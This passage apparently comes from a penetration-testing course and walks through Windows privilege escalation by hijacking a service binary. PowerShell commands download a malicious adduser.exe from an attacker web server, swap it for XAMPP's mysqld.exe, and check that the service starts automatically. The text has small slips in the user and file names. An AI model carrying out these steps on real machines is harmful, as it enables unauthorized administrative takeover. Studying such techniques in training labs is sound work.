Once adduser.exe is cross-compiled, we can transfer it in order to replace it and the original mysql.exe with our malicious copy.

For this start, we use a Python3 web server in the output directory of adduser.exe on our Kali machine and use it over the target machine in a PowerShell window to download our executable file. In addition, we move the original mysql.exe to our home directory. Then, we can restore the service after a successful privilege escalation.

```
PS C:\Users\ave> iwr -uri http://192.168.119.33/adduser.exe -Outfile adduser.exe
PS C:\Users\ave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\ave> move .adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

```
PS C:\Users\ave> net stop mysql
```

Listing 418 - Attempting to stop the service in order to restart it

Unfortunately, dave doesn't have sufficient permissions to stop the service. This is expected as most services are only managed by administrative users.

Since we do not have permission to manually restart the service, we must consider another approach. If the Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

Let's check the Startup Type of the mysql service with the help of the Get-CimInstance by selecting Name and StartMode as filter for the service "mysql" with Where-Object.

```
PS C:\Users\ave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
Name StartMode
mysql Auto
```
